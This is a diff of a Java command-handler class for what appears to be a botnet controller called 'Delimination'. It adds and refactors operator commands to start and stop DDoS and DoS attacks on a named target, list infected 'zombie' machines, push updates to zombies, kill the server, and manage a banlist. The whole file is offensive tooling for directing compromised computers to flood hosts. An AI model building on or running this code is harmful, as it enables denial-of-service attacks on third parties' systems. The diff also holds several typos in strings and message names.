@@ -46,18 +46,20 @@ public class CommandActions {
 				}
 
 				try {
-					boolean start = command.getCommandArguments()[0].equals("start");
-					if (start) {
+					if (command.getCommandArguments()[0].equals("start")) {
 						ClientNetwork.getClient().getOutputStream()
 								.writeObject(new DataPackage(command.getCommandArguments()[1],
 										command.hasFlag("-l") ? Integer.parseInt(command.getFlag("-l").getValue()) : 32,
 										command.hasFlag("-t") ? Integer.parseInt(command.getFlag("-t").getValue()) : 1)
 												.setMessage("START_DDOS"));
 						System.out.println("Started DDoS attack on " + command.getCommandArguments()[1] + ".");
-					} else {
+					} else if (command.getCommandArguments()[0].equals("stop")) {
 						ClientNetwork.getClient().getOutputStream()
 								.writeObject(new DataPackage(command.getCommandArguments()[1]).setMessage("STOP_DDOS"));
 						System.out.println("Stopped DDoS attack on " + command.getCommandArguments()[1] + ".");
+					} else {
+						System.out.println("Unkown DDoS action: " + command.getCommandArguments()[0]);
+						return null;
 					}
 				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
@@ -111,15 +113,18 @@ public class CommandActions {
 					} else if (command.getCommandArguments()[0].equals("computers")) {
 						ClientNetwork.getClient().getOutputStream()
 								.writeObject(new DataPackage().setMessage("LIST_ALL"));
+					} else {
+						System.out.println("Unknown list target: " + command.getCommandArguments()[0]);
+						return null;
 					}
 
 					Computer[] addresses = (Computer[]) ((DataPackage) ClientNetwork.getClient().getInputStream()
 							.readObject()).getObjects();
-					Console.println(
+					System.out.println(
 							"There are " + addresses.length + " " + command.getCommandArguments()[0] + " connected.");
 
 					for (Computer address : addresses) {
-						Console.println(address.getAddress() + (command.getCommandArguments()[0].equals("computers")
+						System.out.println(address.getAddress() + (command.getCommandArguments()[0].equals("computers")
 								? (address.isZombie() ? " (zombie)" : " (client)") : ""));
 					}
 
@@ -142,9 +147,9 @@ public class CommandActions {
 			@Override
 			public Object doJob(Command c) {
 				try {
-					Console.println(Commands.getHelpForAction(c.getCommandArguments()[0], c.getInterface()));
+					System.out.println(Commands.getHelpForAction(c.getCommandArguments()[0], c.getInterface()));
 				} catch (UnknownCommandException e) {
-					Console.println("Unknown command: " + c.getCommandArguments()[0]);
+					System.out.println("Unknown command: " + c.getCommandArguments()[0]);
 				}
 				return null;
 
@@ -156,7 +161,7 @@ public class CommandActions {
 		return new CommandJob() {
 			@Override
 			public Object doJob(Command command) {
-				Console.println(
+				System.out.println(
 						"Invalid command \"" + baseCommand + "\". Use the \"help\" command for a list of commands.");
 				return null;
 			}
@@ -167,14 +172,14 @@ public class CommandActions {
 		return new CommandJob() {
 			@Override
 			public Object doJob(Command c) {
-				Console.println("Commands: ");
+				System.out.println("Commands: ");
 
 				String[] commandNames = c.getInterface().getAllCommandsNames();
 				Arrays.sort(commandNames);
 				for (String command : commandNames) {
-					Console.println("\t" + command);
+					System.out.println("\t" + command);
 				}
-				Console.println("Type \"help <command>\" for help with a specific command.");
+				System.out.println("Type \"help <command>\" for help with a specific command.");
 				return null;
 			}
 		};
@@ -237,17 +242,17 @@ public class CommandActions {
 					}
 				}
 
-				boolean start = command.getCommandArguments()[0].equals("start");
-
-				if (start) {
+				if (command.getCommandArguments()[0].equals("start")) {
 					DOS.setArguments(command.getCommandArguments()[1],
 							command.hasFlag("-l") ? Integer.parseInt(command.getFlag("-l").getValue()) : 32,
 							command.hasFlag("-t") ? Integer.parseInt(command.getFlag("-t").getValue()) : 1);
 					DOS.start();
-					Console.println("Started DoS attack on " + command.getCommandArguments()[1] + ".");
-				} else {
+					System.out.println("Started DoS attack on " + command.getCommandArguments()[1] + ".");
+				} else if (command.getCommandArguments()[0].equals("stop")) {
 					DOS.stop();
-					Console.println("Stopped DoS attack on " + command.getCommandArguments()[1] + ".");
+					System.out.println("Stopped DoS attack on " + command.getCommandArguments()[1] + ".");
+				} else {
+					System.out.println("Unknown DoS action: " + command.getCommandArguments()[0]);
 				}
 
 				return null;
@@ -390,9 +395,12 @@ public class CommandActions {
 							.writeObject(new DataPackage().setMessage("KILL_SERVER"));
 				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
+					return null;
 				} catch (IOException e) {
 					e.printStackTrace();
+					return null;
 				}
+				System.out.println("Successfully the server.");
 				return null;
 			}
 		};
@@ -432,12 +440,17 @@ public class CommandActions {
 						ClientNetwork.getClient().getOutputStream().writeObject(
 								new DataPackage(new InetSocketAddress(split[0], Integer.parseInt(split[1])))
 										.setMessage("UPDATE_ZOMBIE"));
+					} else {
+						System.out.println("Unknown target: " + command.getCommandArguments()[0]);
+						return null;
 					}
 				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
+				System.out.println(
+						"Updated the Delimination " + command.getCommandArguments()[0] + " program on the target.");
 				return null;
 			}
 		};
@@ -540,6 +553,49 @@ public class CommandActions {
 					Exceptions.unconnectedException();
 				} catch (Exception e) {
 					return null;
+				}
+				return null;
+			}
+		};
+	}
+
+	public static CommandJob getBanlistAction() {
+		return new CommandJob() {
+			@Override
+			public Object doJob(Command command) {
+				try {
+					if (command.hasCommandArguments()) {
+						String ip = command.getCommandArguments()[1].trim();
+
+						if (command.getCommandArguments()[0].equals("add")) {
+							ClientNetwork.getClient().getOutputStream()
+									.writeObject(new DataPackage(ip).setMessage("BAN_COMPUTER"));
+							System.out.println("Added " + ip + " from the banlist.");
+						} else if (command.getCommandArguments()[0].equals("remove")) {
+							ClientNetwork.getClient().getOutputStream()
+									.writeObject(new DataPackage(ip).setMessage("UNBAN_COMPTUER"));
+							System.out.println("Removed " + ip + " from the banlist.");
+						} else {
+							System.out.println("Unknown banlist action: " + command.getCommandArguments()[0]);
+							return null;
+						}
+					} else {
+						ClientNetwork.getClient().getOutputStream()
+								.writeObject(new DataPackage().setMessage("GET_BAN_LIST"));
+						Computer[] computers = (Computer[]) ((DataPackage) ClientNetwork.getClient().getInputStream()
+								.readObject()).getObjects();
+						System.out.println("Banned computers:");
+						for (Computer computer : computers) {
+							System.out.println(computer.getAddress().toString().split(Pattern.quote(":"))[0] + " ("
+									+ (computer.isZombie() ? "zombie" : "client") + ")");
+						}
+					}
+				} catch (SocketException | NullPointerException e) {
+					Exceptions.unconnectedException();
+				} catch (IOException e) {
+					e.printStackTrace();
+				} catch (ClassNotFoundException e) {
+					e.printStackTrace();
 				}
 				return null;
 			}
